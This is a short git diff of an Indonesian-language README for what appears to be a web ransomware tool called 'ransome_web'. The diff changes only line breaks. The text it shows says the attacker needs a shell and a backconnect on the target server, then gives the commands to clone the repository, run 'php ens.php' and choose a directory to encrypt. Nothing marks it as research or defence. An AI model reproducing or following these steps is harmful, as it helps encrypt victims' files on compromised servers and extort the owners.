@@ -6,10 +6,10 @@ Peraturan & Bahan:
 - Usahakan Punya Shell
 - Backconnect (karena mendapatkan proses yang agak lama, dan biar gak request time out)
 
-Step : 
-$ git clone https://github.com/indosec/ransome_web.git
-$ cd ransome_web
-$ php ens.php
+Step : <br>
+$ git clone https://github.com/indosec/ransome_web.git <br>
+$ cd ransome_web <br>
+$ php ens.php <br>
 
 dan Pilih Path yang akan di Enkrip
 
